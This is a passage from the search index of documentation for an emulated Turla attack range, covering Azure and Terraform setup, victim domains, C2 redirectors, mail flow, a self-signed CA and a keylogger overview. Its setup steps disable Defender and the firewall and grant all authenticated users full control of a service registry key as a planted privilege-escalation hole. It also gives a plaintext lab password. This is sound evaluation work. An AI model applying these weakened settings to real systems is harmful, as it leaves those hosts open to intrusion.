5"},{"l":"Requirements","p":["Name","Version","terraform",">=1.1.0","azurerm","<=3.43"]},{"l":"Providers","p":["Name","Version","azurerm","3.43.0","random","3.5.1"]},{"l":"Modules","p":["../modules/linuxsrv-latest-static","../modules/rgroup","../modules/windesk-latest-static","../modules/winsrv-latest-static","boltnet-redirect-srv1","boltnet-redirect-srv2","boltnet-redirect-srv3","carbon-ad-srv1","carbon-desk1","carbon-desk2","carbon-desk3","carbon-ex-srv1","carbon-web-srv1","n/a","Name","red-kali1","rgroup","snake-ad-srv1","snake-desk1","snake-desk2","snake-ex-srv1","snake-file-srv1","Source","support-dns-srv1","support-jumpbox-srv1","support-pf-srv1","support-web-srv3","Version"]},{"l":"Resources","p":["azurerm_client_config.current","azurerm_public_ip.main","azurerm_subnet.boltnet","azurerm_subnet.carbon_desk","azurerm_subnet.carbon_srv","azurerm_subnet.red","azurerm_subnet.snake_desk_v2","azurerm_subnet.snake_srv_v2","azurerm_subnet.support","azurerm_subnet.vpn","azurerm_subscription.current","azurerm_virtual_network_gateway.main","azurerm_virtual_network_peering.peer1to2","azurerm_virtual_network_peering.peer1to3","azurerm_virtual_network_peering.peer2to1","azurerm_virtual_network_peering.peer2to3","azurerm_virtual_network_peering.peer3to1","azurerm_virtual_network_peering.peer3to2","azurerm_virtual_network.vnet1","azurerm_virtual_network.vnet2","azurerm_virtual_network.vnet3","data source","Name","random_id.id-random","resource","Type"]},{"l":"Inputs","p":["[\"176.59.15.33\",\"176.59.15.44\"]","[\"91.52.201.144\",\"91.52.201.202\"]","[\"91.52.201.31\",\"91.52.201.98\",\"91.52.201.119\"]","[\"91.52.62.64\",\"91.52.62.137\",\"91.52.62.203\"]","10.100.0.0/16","10.100.30.0/24","10.100.30.202","10.100.30.203","10.100.30.204","10.100.40.0/24","10.100.40.102","10.100.40.103","10.20.0.0/16","10.20.10.0/24","10.20.10.17","10.20.10.23","10.20.10.9","10.20.20.0/24","10.20.20.102","10.20.20.103","10.20.20.104","10.20.50.0/24","10.20.60.0/24","176.59.0.0/16","176.59.15.0/24","176.59.15.13","176.59.15.55","17763.3406.220909","18362.1256.2012032308","19044.2006.220909","19h1-pro-gensecond","2019-datacenter","2019.0.20190410","91.52.0.0/16","91.52.201.0/24","91.52.201.21","91.52.201.22","91.52.201.29","91.52.62.0/24","Additional address range for vnet1","azuolas","Azure location/region for resources","bannik","berlios","berzas","brieftragerin","carbon_desk_1_hostname","carbon_desk_1_ip","carbon_desk_2_hostname","carbon_desk_2_ip","carbon_desk_3_hostname","carbon_desk_3_ip","carbon_srv_ad_hostname","carbon_srv_ad_ip","carbon_srv_ex_hostname","carbon_srv_ex_ip","carbon_srv_web_hostname","carbon_srv_web_ip","carbon_support_c2_ip_list","carbon_win_ad_srv_os_azure_source_image_sku","carbon_win_ad_srv_os_azure_source_image_version","carbon_win_desk_os_azure_source_image_sku","carbon_win_desk_os_azure_source_image_version","carbon_win_srv_os_azure_source_image_sku","carbon_win_srv_os_azure_source_image_version","clymer","Default","Description","Detlab hostname","detlab_srv_hostname","detlab_srv_ip","dev_linux_password","dev_linux_username","dev_win_admin_password","dev_win_admin_username","devadmin","Domain name for AD","Domain name for Carbon","Domain name for Snake","domovoy","drebule","hobgoblin","IP range of subnet (must be within vnet 2 address space)","IP range of subnet 1 on vnet 1 (must be within vnet 1 address space)","IP range of subnet 2 on vnet 1 (must be within vnet 1 address space)","IP range of subnet 3 on vnet 1 (must be within vnet 1 address space)","IP range of subnet 4 on vnet 1 (must be within vnet 1 address space)","IP range of subnet 5 on vnet 1 (must be within vnet 1 address space)","IP range of subnet on vnet 3 (must be within vnet 3 address space)","IPs to be assigned to C2","kagarov","khabibulin","kontos","list(string)","location","modin","n/a","Name","name-prefix","Netbios name for AD","Netbios name for Carbon","Netbios name for Snake","nk","nk.local","no","Password for dev Linux hosts","Password for Windows 10 desktop dev boxes","Path to SSH private key to use for Linux ssh systems (public and private key must be matching pair)","Path to SSH public key to use for Linux ssh systems (public and private key must be matching pair)","red_jumpbox_hostname","red_jumpbox_ip","red_kali_platform_hostname","red_kali_platform_ip_list","red_postfix_hostname","red_web_hostname","Required","richards","skt","skt.local","Sku for Windows Server to use (Carbon AD server only)","Sku for Windows Server to use (Carbon)","Sku for Windows Server to use (snake)","snake_desk_1_hostname","snake_desk_1_ip","snake_desk_2_hostname","snake_desk_2_ip","snake_srv_ad_hostname","snake_srv_ad_ip","snake_srv_ex_hostname","snake_srv_ex_ip","snake_srv_file_hostname","snake_srv_file_ip","snake_support_c2_ip_list","snake_support_c2_ip_list_2","snake_win_desk_os_azure_source_image_sku","snake_win_desk_os_azure_source_image_version","snake_win_srv_os_azure_source_image_sku","snake_win_srv_os_azure_source_image_version","ssh_private_key_path","ssh_public_key_path","stelio","stlouis","string","String prefix for resource names","support_dns_hostname","support_dns_ip","support_postfix_ip","support_web_ip","Type","uosis","Username for Linux hosts","Username for Windows 10 desktop dev boxes","Version for Windows Server to use (Carbon AD server only)","Version for Windows Server to use (Carbon)","Version for Windows Server to use (snake)","vnet 1 address space","vnet 2 address space","vnet 3 address space","vnet1-address-space","vnet1-address-space-2","vnet1-sub1-range","vnet1-sub2-range","vnet1-sub3-range","vnet1-sub4-range","vnet1-sub5-range","vnet1-sub6-range","vnet2-address-space","vnet2-sub1-range","vnet3-address-space","vnet3-sub1-range","vnet3-sub2-range","win_carbon_domain_name","win_carbon_netbios_name","win_domain_name","win_netbios_name","win_snake_domain_name","win_snake_netbios_name","win_srv_admin_password","win_srv_admin_username","win10-21h2-pro-g2","Windows server admin password","Windows Server admin username","yes"]},{"l":"Outputs","p":["No outputs."]}],[{"l":"Carbon Victim LAN Setup","p":["Domain Controller - Bannik","Desktop - Hobgoblin","Desktop - Domovoy","Desktop - Khabibulin","Exchange - Brieftragerin","Web Server - Kagarov","Script order and dependencies"]},{"i":"domain-controller---bannik","l":"Domain Controller - Bannik","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","bannik-create-carbon-domain.ps1","Creates the Carbon scenario Active Directory domain (“skt.local”)","bannik-create-carbon-users.ps1","Creates domain users and domain groups for Carbon scenario","bannik-set-dns-resolution.ps1","Set primary and secondary DNS on endpoints to the DC","bannik-set-adalwolfa-group-membership.ps1","Add Kagarov to Webservers group"]},{"i":"desktop---hobgoblin","l":"Desktop - Hobgoblin","p":["all-carbon-enable-remote-desktop-for-domain-users.ps1","all-join-carbon-domain.ps1","choco-install-packages.ps1","chocolatey-install.ps1","Copy the windows-service/dist/ViperVPN.exe file to Hobgoblin","Enable remote desktop access for Domain Users","Execute the following command from the Command Prompt.","Install SetACL Studio on Hobgoblin (see WindowsService for download link)","Installs Chocolatey Package Manager","Installs sysinternals, vscode, and microsoft-edge","Join the Carbon domain","Modify the ACL on the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ViperVPNSvc to grant full control to Authenticated Users.","Open Adminstrator Command Prompt on Hobgoblin","Script","Summary","The Hobgoblin host also runs the ViperVPN Windows service used in the scenario. After running the setup, perform the following steps:","ViperVPN.exe --startup delayed install"]},{"i":"desktop---domovoy","l":"Desktop - Domovoy","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-carbon-domain.ps1","Join the Carbon domain","all-carbon-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users"]},{"i":"desktop---khabibulin","l":"Desktop - Khabibulin","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-carbon-domain.ps1","Join the Carbon domain","all-carbon-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users","khabibulin-set-local-admin.ps1","Set Adalwolfa as Local Administrator on khabibulin"]},{"i":"exchange---brieftragerin","l":"Exchange - Brieftragerin","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-carbon-domain.ps1","Join the Carbon domain","all-carbon-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users","brieftragerin-install-exchange.ps1","Install Exchange","brieftragerin-create-carbon-exchange-admin.ps1","Create Exchange administrator"]},{"i":"web-server---kagarov","l":"Web Server - Kagarov","p":["Script","Summary","kagarov-setup.sh","Installs dependencies for Kagarov and configures DNS","kagarov-join-domain.sh","Joins Kagarov host to domain"]},{"l":"Script order and dependencies","p":["Run chocolatey-install.ps1 on all victim machines.","Run choco-install-packages.ps1 on all victim machines.","Run bannik-create-carbon-domain.ps1 script on bannik.","Run bannik-create-carbon-users.ps1 script on bannik.","Run all-join-carbon-domain.ps1 script on all respective Windows endpoints that should be joined to the domain.","Run all-carbon-enable-remote-desktop-for-domain-users.ps1 on all Desktop endpoints to enable remote desktop access for Domain Users.","Run kagarov-setup.sh and kagarov-join-domain.sh on kagarov, as user with effective root permissions.","Run the brieftragerin-install-exchange.ps1 on brieftragrein, make sure that the server was properly joined to the domain in the previous step.","Run brieftragerin-create-carbon-exchange-admin.ps1 on brieftragrein","Run khabibulin-set-local-admin.ps1 on khabibulin","Run bannik-add-computer-descriptions.ps1 on bannik","Run bannik-set-adalwolfa-group-membership.ps1 on bannik","Run bannik-set-dns-resolution.ps1 on bannik","Disable Defender on all Windows machines (requires manual setup)","Open MS Defender Settings -> Virus Protection and manually uncheck everything and save."]}],[{"l":"DNS Configuration","p":["Unbound DNS, by NLnet Labs, was used to provide DNS services for the range. The configuration is available in the resources/dns folder.","Run the install-unbound-dns.sh script on stlouis.","Copy the resources/dns/*.conf files to stlouis host to /etc/unbound/unbound.conf.d/","Restart the unbound service, sudo systemctl restart unbound."]}],[{"l":"Getting Started","p":["This document covers the infrastructure setup for emulating Turla in Round 5 of ATT&CK Evaluations Enterprise.","Prerequisites","Terraform","Detections vs Protections","Setup Guides","Support - Setup First","Carbon","Snake","Red Team"]},{"l":"Prerequisites","p":["It is assumed you have a working knowledge of the following concepts and access to related tools:","Terraform,","PowerShell,","Linux Shell Scripting (e.g. bash),","Existing Microsoft Azure with permissions to perform required actions (create manage resources including VM instances, VNETs, Virtual Network Gateways, and related resources),","Azure CLI,","Concepts such as DNS, Email,","PKI,","and common system administration concepts for Windows and Linux"]},{"l":"Terraform","p":["cp -a deploy.auto.tfvars.template deploy.auto.tfvars","Create a Terraform settings file from the included template.","Execute the Terraform plan created in the previous step.","Initialize your Terraform environment.","NOTE: This step may take a 15-30 minutes to properly provision all resources. This is normal.","NOTE: You may be prompted to accept the Terms and subscribe for the Kali image in the Azure Marketplace. If prompted, follow the URL provided in the terminal and click the Subscribe button. Once the process completes, re-run the Terraform plan and apply commands below.","Open the deploy.auto.tfvars in an editor, and configure with desired values.","Plan your deployment with Terraform.","terraform apply tfplan","terraform init","Terraform is used to initialize the Turla infrastructure.","terraform plan --out=tfplan","terraform validate","Time to run Terraform.","Validate your Terraform configuration.","You are done, celebrate!"]},{"l":"Detections vs Protections","p":["For the Turla evaluation, the Protections evaluation was conducted on a clone of the Detections range. Therefore there is only one infrastructure configuration, there is no differernce from an Infrastructure perspective whether the environment is used for Detections or Protections, all setup is identical."]},{"l":"Setup Guides","p":["There are four components of the Turla infrastructure, each broken out below. Each guide assumes the infrastructure has already been setup with Terraform."]},{"i":"support---setup-first","l":"Support - Setup First","p":["Contains resources that support the entire range, such as DNS, mail, and traffic redirection. Should be setup first, prior to configuring other components.","See Setup Support for details."]},{"l":"Carbon","p":["Contains resources related to the Carbon scenario, also referenced as \"Scenario 1\".","See Setup Carbon for details."]},{"l":"Snake","p":["Contains resources related to the Snake scenario, also referenced as \"Scenario 2\".","See Setup Snake for details."]},{"l":"Red Team","p":["Contains resources that support Red Team activity directly.","See Setup Red Team for details."]}],[{"l":"Infrastructure for Turla Evaluation","p":["The Turla infrastructure is split over two scenarios, Scenario 1 (Carbon) and Scenario 2 (Snake). For convenience, both scenarios share supporting infrastructure, including attacker platform, DNS, mail server, and traffic forwarding hosts.","Initial infrastructure was setup using Terraform, with configuration applied via scripts and configuration files.","Infrastructure Overview","Scenario VMs","Carbon","Snake","Support Hosts","Network Services","Network Diagram","TLS Certificates","Domains Used","Email Flow","Windows Service (Carbon Scenario Only)"]},{"l":"Infrastructure Overview","p":["This document provides an overview of the infrastructure support used for the evaluation. In addition to setup and configuration of virtual machines, this document covers infrastructure support services, such as DNS, mail, and traffic redirection, used to support the evaluation. The Carbon and Snake scenarios both shared the same set of support services for efficiency.","Any references to scenario or range hosts is referencing all Carbon and Snake hosts, unless otherwise specified."]},{"l":"Scenario VMs"},{"l":"Carbon","p":["10.20.10.17","10.20.10.23","10.20.10.9","10.20.20.102","10.20.20.103","10.20.20.104","Active Directory Domain Controller","bannik","brieftragerin","domovoy","hobgoblin","Hostname","IP","kagarov","khabibulin","Microsoft Exchange Server","OS","Role","The Carbon scenario consists of six virtual machines, all joined to the skt.local Windows domain.","Ubuntu 20.04.4 LTS - Kernel: 5.15.0-1031-azure","Ubuntu Linux Workstation","Windows 10 Pro - 10.0.19041.1806","Windows Server 2019 Datacenter - 10.0.17763.2867","Windows Server 2019 Datacenter - 10.0.17763.404","Windows Workstation"]},{"l":"Snake","p":["10.100.30.202","10.100.30.203","10.100.30.204","10.100.40.102","10.100.40.103","Active Directory Domain Controller","azuolas","berlios","berzas","drebule","Exchange Server","File Server","Hostname","IP","OS","Role","The Snake scenario consists of five virtual machines, all joined to the nk.local Windows domain.","uosis","Windows 10 Pro - 10.0.18362.1171","Windows Server 2019 Datacenter - 10.0.17763.2867","Windows Workstation"]},{"l":"Support Hosts","p":["91.52.201.21","91.52.201.22","91.52.201.29","amalie","bolt","DNS Server","eth0: 91.52.201.144, eth1: 91.52.201.202","eth0: 91.52.201.31, eth1: 91.52.201.98, eth2: 91.52.201.119","eth0: 91.52.62.64, eth1: 91.52.62.137, eth2: 91.52.62.203","Hostname","IP(s)","nato-int.com","OS","Postfix Mail Server","Role","stamp.innovationmail.net","stlouis.notfastdns.com","thunderbug","Traffic Redirector","Ubuntu 20.04","Web Server"]},{"l":"Red Team Hosts","p":["Hostname","OS","Role","IP(s)","modin","Kali Linux","Attack Platform","eth0: 176.59.15.33, eth1: 176.59.15.44","stelio","Windows Server 2019","Attacker Jumpbox","176.59.15.13"]},{"l":"Network Services","p":["In addition to the VMs in scope for vendor security software during the evaluation, additional hosts were required to provide the full complement of services to fully emulate the scenario."]},{"l":"Network Diagram","p":["The diagram below shows the layout of both scenario networks, attack platform, and support hosts."]},{"l":"TLS Certificates","p":["A self-signed certificate authority was generated to emulate a legitimately assigned TLS certificate for the domain svobodaukrayin[.]ua. See the Certificate Authority page for further details on how the certificates were created and configured."]},{"l":"Domains Used","p":["URL","Usage","Notes","svobodaukrayin[.]ua, www.svobodaukrayin[.]ua","Web Certificate","Emulated registered domain with valid TLS certificate"]},{"l":"Email Flow","p":["Email services used Microsoft Exchange 2019 for email processing for each scenario domain, with Postfix used as the external email server. More details are provided in the Email Flow page."]},{"i":"windows-service-carbon-scenario-only","l":"Windows Service (Carbon Scenario Only)","p":["The Carbon Windows VMs had a custom Windows Service installed, Viper VPN Service. Details of the service code and configuration are provided in the linked document."]}],[{"l":"Mail Flow","p":["Overview","Email Flow","Email - Inbound To Scenario Exchange Servers","Email - Outbound From Scenario Exchange Servers","Mail Flow Diagram"]},{"l":"Overview","p":["Mail Exchange DNS records (MX) are used to determine email routing for both inbound and outbound email. When the terms Inbound and Outbound are used in this document, Inbound and Outbound are always relative the the Exchange Servers perspective.","Postfix was used as the mail server external to the vendor range."]},{"l":"Email Flow"},{"i":"email---inbound-to-scenario-exchange-servers","l":"Email - Inbound To Scenario Exchange Servers","p":["Postfix was used to provide email services external to the scenario domains. From the attacker platform, email was masked to rewrite emails originating from the attacker platform to a different domain name, to further obscure the attacking platform."]},{"i":"email---outbound-from-scenario-exchange-servers","l":"Email - Outbound From Scenario Exchange Servers","p":["When sending email from Exchange, Exchange used DNS lookups to identify mail servers to send email. For the evaluation, all email sent to *@innovationmail.net(for all users) was always forwarded to cradwell@notslowmail.com. The cradwell@notslowmail.com inbox was processed using Procmail scripts, to extract all attachments from emails to a separate directory."]},{"l":"Mail Flow Diagram"}],[{"l":"Red Team Setup","p":["Red LAN","Red LAN Systems to Configure","Attack Platform - Modin","Jumpbox - Stelio"]},{"l":"Red LAN"},{"l":"Red LAN Systems to Configure"},{"i":"attack-platform---modin","l":"Attack Platform - Modin","p":["chown -R cradwell:cradwell /home/cradwell/.procmailrc /home/cradwell/mail","Configuration","Enable and start postfix, run:","Ensure Apache and Mariadb are enabled","Follow instructions to setup watering_hole","Install","Install files/support/kali/kali-home-cradwell-procmailrc to /home/cradwell/.procmailrc","Install files/support/kali/kali-postfix-conf to /etc/postfix/main.cf","mkdir -p /home/cradwell/mail","Run files/support/kali/kali-install-custom-certs.sh","Run files/support/kali/kali-prereqs.sh","Run files/support/kali/kali-send-email.sh","Run files/support/kali/kali-set-nato-int-redirect.sh","Run files/support/kali/kali-update-wp.sh","Run files/support/kali/kali-update.sh","Set proper file ownership on .procmailrc file, and make mail directories, run:","systemctl enable --now apache2","systemctl enable --now mysql","systemctl enable --now postfix"]},{"i":"jumpbox---stelio","l":"Jumpbox - Stelio","p":["The Windows Jumpbox requires minimal configuration.","Configuration","Run files/common/chocolatey-install.ps1","Run files/common/choco-install-packages.ps1","Run files/common/disable-firewall.ps1","Run files/common/configure-jumpbox.ps1"]}],[{"l":"Self Signed Certificate Authority","p":["Summary","Example Certificate Authority Creation","Create Host Certificate","Install on Snake Windows Domain","Update on Kali box","Install custom certificate on Kali box","Setup nato-int[.]com redirect","Update Wordpress installation","Send Carbon Scenario Email"]},{"l":"Summary","p":["CloudFlare's CFSSL project was used to generate a certificate authority, intermediate certificate, and host certificate for the scenario, to emulate a valid issued TLS certificate."]},{"l":"Example Certificate Authority Creation","p":["The following provides an example of how to generate the CA, intermediate CA, and host certificate using CFSSL. A full explanation of CFSSL can be found on the project GitHub page.","Update ca.json, intermediate-ca.json, and host1.json as appropriate to reflect the new certificate authority, certificate authority intermediate certificate, and host certificate for web host.","The cfssl.json provided has the needed roles predefined, but may need to be modified based on your particular needs.","Run the following commands to generate the CA certificate, and intermediate issuing certificate:"]},{"l":"Create Host Certificate","p":["Run the following command:","Jobs done."]},{"l":"Install on Snake Windows Domain","p":["Use Group Policy to deploy trusted certificate on domain.","Connect to Snake Active Directory controller ( berlios)","Follow directions from Microsoft to trust certificate authority and intermediate certificate on domain.","Deploy updated group policy to nk domain."]},{"l":"Update on Kali box"},{"l":"Install custom certificate on Kali box","p":["From Kali, run kali-install-custom-certs.sh"]},{"i":"setup-nato-intcom-redirect","l":"Setup nato-int[.]com redirect","p":["From Kali, run kali-set-nato-int-redirect.sh"]},{"l":"Update Wordpress installation","p":["From Kali, run kali-update-wp.sh"]},{"l":"Send Carbon Scenario Email","p":["From Kali, run kali-send-email.sh"]}],[{"l":"Snake Victim LAN Setup","p":["Domain Controller - Berlios","Desktop - Uosis","Desktop - Azuolas","Exchange - Drebule","File Server - Berzas","Script order and dependencies"]},{"i":"domain-controller---berlios","l":"Domain Controller - Berlios","p":["berlios-create-fileserver-admin.ps1","berlios-create-snake-domain.ps1","berlios-create-snake-users.ps1","berlios-set-computer-descriptions.ps1","berlios-set-dns-resolution.ps1","choco-install-packages.ps1","chocolatey-install.ps1","Creates domain users and domain groups for Snake scenario","Creates necessary File Server Admin group","Creates the Snake scenario Active Directory domain (“nk.local”)","Installs Chocolatey Package Manager","Installs sysinternals, vscode, and microsoft-edge","Script","Set primary and secondary DNS on endpoints to the DC","Sets the names and descriptions of endpoints joined to Snake scenario domain","Summary"]},{"i":"desktop---uosis","l":"Desktop - Uosis","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-snake-domain.ps1","Join the Snake domain","all-snake-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users"]},{"i":"desktop---azuolas","l":"Desktop - Azuolas","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-snake-domain.ps1","Join the Snake domain","all-snake-enable-remote-desktop-for-domain-users.ps1","Enable remote desktop access for Domain Users","azuolas-enable-fileserver-admin.ps1","Enable File Server Admin permissions as Local Administrator"]},{"i":"exchange---drebule","l":"Exchange - Drebule","p":["all-join-snake-domain.ps1","choco-install-packages.ps1","chocolatey-install.ps1","Create Exchange administrator","Disable WMIC integrity check","drebule-create-snake-exchange-admin.ps1","drebule-disable-wmic-integrity-check.ps1","drebule-enable-remote-desktop-for-exchange-admin.ps1","drebule-install-exchange.ps1","Enable remote desktop access for Exchange administrator","Install Exchange","Installs Chocolatey Package Manager","Installs sysinternals, vscode, and microsoft-edge","Join the Snake domain","Script","Summary"]},{"i":"file-server---berzas","l":"File Server - Berzas","p":["Script","Summary","chocolatey-install.ps1","Installs Chocolatey Package Manager","choco-install-packages.ps1","Installs sysinternals, vscode, and microsoft-edge","all-join-snake-domain.ps1","Join the Snake domain","berzas-enable-remotedesktop-for-snake-fileserver.ps1","Enable remote desktop access for File Server admin","berzas-install-admodule.ps1","Install AD Powershell module","berzas-set-local-admin.ps1","Configure File Server Admin as local administrator"]},{"l":"Script order and dependencies","p":["Disable Defender on all Windows machines (requires manual setup).","Open MS Defender Settings -> Virus Protection and manually uncheck everything and save.","Run all-join-snake-domain.ps1 scripts on all respective Windows endpoints that should be joined to the domain.","Run azuolas-enable-fileserver-admin.ps1 on azuolas.","Run berlios-create-fileserver-admin.ps1 on berlios.","Run berlios-create-snake-domain.ps1 scripts on berlios.","Run berlios-create-snake-users.ps1 scripts on berlios.","Run berlios-set-computer-descriptions.ps1 on berlios.","Run berlios-set-dns-resolution.ps1 on all endpoints.","Run berzas-enable-remotedesktop-for-snake-fileserver.ps1 on berzas.","Run berzas-install-admodule.ps1 script on berzas.","Run berzas-set-local-admin.ps1 on berzas.","Run choco-install-packages.ps1 on all victim machines.","Run chocolatey-install.ps1 on all victim machines.","Run drebule-create-snake-exchange-admin.ps1 on drebule.","Run drebule-enable-remote-desktop-for-exchange-admin.ps1 on drebule.","Run drebule-install-exchange.ps1 on drebule, make sure that the server was properly joined to the domain in previous step."]}],[{"l":"Support LAN","p":["Support LAN Systems to Configure","Redirectors","DNS","Mail","Web Server","Traffic Redirectors"]},{"l":"Support LAN Systems to Configure"},{"l":"Redirectors","p":["Amalie - Redirector","enable-traffic-forwarding-rules-amalie.sh - Set up the traffic forwarding rules for amalie redirector","Thunderbug - Redirector","enable-traffic-forwarding-rules-thunderbug.sh - Set up the traffic forwarding rules for thunderbug redirector","Bolt - Redirector","enable-traffic-forwarding-rules-bolt.sh - Set up the traffic forwarding rules for bolt redirector"]},{"l":"DNS","p":["stlouis DNS server supports DNS for the range.","Install","install-unbound-dns.sh- Installs the Unbound DNS package on stlouis DNS server.","Configuration","Install all files/support/dns/*.conf files to the /etc/unbound/unbound.conf.d/ directory."]},{"l":"Mail","p":["The stamp server runs Postfix for the range. See Email Flow for more details on how mail is routed.","Install","As root, run the following commands to install Postfix and configure DNS:","DEBIAN_FRONTEND=noninteractive apt install -y postfix ripmime mailutils procmail","Run files/support/mail/stamp-configure-dns.sh to configure DNS.","Configuration","Install files/support/mail/etc_mailname to /etc/mailname","Install files/support/mail/etc_postfix_main.cf to /etc/postfix/main.cf","Install files/support/mail/etc_postfix_virtual.cf to /etc/postfix/virtual.cf","Run postmap /etc/postfix/virtual to build the virtual domain aliases.","Run systemctl enable --now postfix systemctl restart postfix to apply the new configuration."]},{"l":"Web Server","p":["nato-int.com - Web Server","Install","As root, run the following commands:","apt update apt install -y git etckeeper apache2 wget","hostnamectl set-hostname nato-int.com","systemctl enable --now apache2"]},{"l":"Traffic Redirectors","p":["All Redirectors as root","apt update apt install -y netfilter-persistent","chmod +x /opt/*.sh","Configuration","Control","Copy the following files to every redirector (destination doesn't matter, /opt/ used for examples)","Copy the matching enable-traffic-forwarding-HOSTNAME.sh script to each redirector (e.g. enable-traffic-forwarding-amalie.sh to amalie)","Disable forwarding","files/support/redirectors/disable-traffic-forwarding-rules.sh","files/support/redirectors/print-traffic-forwarding-rules.sh","Install","Make scripts executable","Run /opt/disable-traffic-forwarding-rules.sh to disable forwarding.","Run /opt/enable-traffic-forwarding-HOSTNAME.sh on each host","Run /opt/print-traffic-forwarding-rules.sh view the current forwarding configuration","View configuration"]}],[{"l":"Traffic Redirectors","p":["Evaluations occurred in Microsoft Azure, which limits the number of network interfaces that can be attached to VM. Three redirectors were required to support traffic redirection for eight IP addresses.","Traffic redirection is performed using iptables NAT masquerading, with traffic sent to specific destination ports on a particular network interface being redirected to a specific IP address and port. Scripts in the setup/ folder provide the following functionality:","enable-traffic-forwarding-rules-HOSTNAME.sh","Running the script on a server will configures network forwarding rules. Note that forwarding rules are based on network interfaces. As multiple IP addresses are attached to redirector VMs, double check the network interfaces are assigned to the expected IP addresses.","disable-traffic-forwarding-rules.sh","Running the script on a server will disable and clear any network forwarding rules in place.","print-traffic-forwarding-rules.sh","Running the script will print to stdout any network forwarding rules currently configured."]},{"l":"Table of URLs and IPs used by Redirectors","p":["91.52.201.119","91.52.201.144","91.52.201.202","91.52.201.31","91.52.201.98","91.52.62.137","91.52.62.203","91.52.62.64","amalie, eth0","amalie, eth1","amalie, eth2","anto-int[.]com","bestcafeswimxp2[.]com","bolt, eth0","bolt, eth1","cheapinfomedical99[.]net","eunewswire[.]eu","gamesiteworldwide2023[.]org","IP","prendre-des-vacances[.]fr","Redirector Host","shoppingbeach[.]org","svobodaukrayin[.]ua","thunderbug, eth0","thunderbug, eth1","thunderbug, eth2","URL"]}],[{"l":"Windows Service"},{"l":"Overview","p":["A custom Windows service was created for the evaluation, Viper VPN Service. The Windows service was a dummy service, using pywin32 and pyinstaller. The source code and build instructions for the Windows service are in the windows-service directory."]},{"l":"Build Instructions","p":["The build must be performed on a Windows host.","NOTE: The following steps assume you have installed Python on your Windows host, and the Python executables are on your system PATH."]},{"l":"Build","p":["Create a Python virtual environment, we will use the name venv for the virtual environment, python -m venv venv.","Activate virtualenv.","venv/Scripts/activate","Use pip to install dependencies.","python -m pip install pywin32 pyinstaller","Run pywin32 post installer script.","python venv/Scripts/pywin32_postinstall.py -install","Deactivate virtualenv.","deactivate","Reactivate virtualenv.","Run build.","Change directory to files/windows-service.","Execute build, pyinstaller.exe --onefile --runtime-tmpdir=. --hidden-import win32timezone viperVpn.py","Binary executable will be output in files/windows-service/dist/ directory.","Use the new executable to continue with Carbon Setup"]},{"l":"SetACL Studio","p":["After the ViperVPNSvc service was installed on the hosts, the service registry key access control was modified.","SetACL Studio was used to configure service permissions, to configure the HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ViperVPNSvc was modified to grant full control to Authenticated Users."]}],[{"l":"Cleanup"},{"l":"Carbon Scenario"},{"l":"Setup","p":["To remove artifacts, run the Cleanup Scripts as from the Kali hosts. You can also run the cleanup scripts on each target as described in their respective directories.","From the Kali Linux machine ( 176.59.15.33):","From the RDP session, open powershell in administrative mode","Run the cleanup commands for each implant listed below that you need to cleanup","Sign out of the RDP session when finished."]},{"l":"EPIC"},{"l":"Carbon"},{"l":"Penquin","p":["Additional documentation here.","From the Kali Linux machine, SCP the Penquin cleanup script to KAGAROV:","Enter Password2! when prompted:","Execute the cleanup script, entering Password2! when prompted:"]},{"l":"Snake Scenario"},{"i":"setup-1","l":"Setup","p":["To remove artifacts, run the Cleanup Scripts as from the Kali hosts. You can also run the cleanup scripts on each target as described in their respective directories.","From the Kali Linux machine ( 176.59.15.33):","From the RDP session, open powershell in administrative mode and set the execution policy","Run the cleanup commands for each implant listed below that you need to cleanup","Reset the execution policy","Sign out of the RDP session when finished."]},{"i":"epic-1","l":"EPIC"},{"l":"Snake"},{"l":"LightNeuron"}],[{"l":"Keylogger"},{"l":"Overview","p":["Access its own process token and duplicate it to create a new primary token","Adjust the duplicated token session ID to match the active session ID","Also note that key combinations (e.g. shift+A, ctrl+c) are not converted into the end result (e.g. special characters or capital letters). It is up to the user to determine what the end result is based on which keys were pressed or released.","Alt","At a technical level, the keylogger will do the following:","Create a new keylogger process using the new token, and then terminate the current process","Ctrl","if started with the -r option, the keylogger will restart itself in the current active session in order to log keystrokes correctly.","keystrokes and other session information are logged to %temp%\\~DFA512.tmp(when running as SYSTEM, this will typically resolve to C:\\Windows\\Temp)","Query sessions until an active one is found, and grab the session ID","register a control handler to catch certain events like ctrl+c for termination in order to log them correctly","set a low-level keyboard hook procedure that will log keystrokes","Shift","start a background thread that keeps track of the current active window. If the current active window changes, the window title and associated process path are logged","The Keylogger is written in C++ and compiles into a single executable file that can be used to capture keystrokes on the target system. The Keylogger is meant to be run as SYSTEM from the Carbon DLL implant as part of the Turla emulation plan.","The keystrokes are logged in the following format: Key Pressed: KEY_NAME for key presses, and Key Released: KEY_NAME for key releases. Note that while all key presses are tracked, key releases are only tracked for the following keys to reduce logging verbosity:","This is needed when running from Carbon DLL because Carbon is kicked off as a SYSTEM service, meaning the keylogger process will not initially be in the same session as the active logged on user. As a result, it won't be able to track foreground windows and keystrokes properly.","This keylogger will perform the following:","Windows key"]},{"l":"Usage","p":["To run the keylogger within an active session, you can execute it as a normal file within a command prompt, and it will kick off the keyboard hook resulting keystrokes. Session info and logging will be found in %temp%\\~DFA512.tmp. To terminate the keylogger, you can exit out of the command prompt window or terminate the process via ctrl+c.","To run the 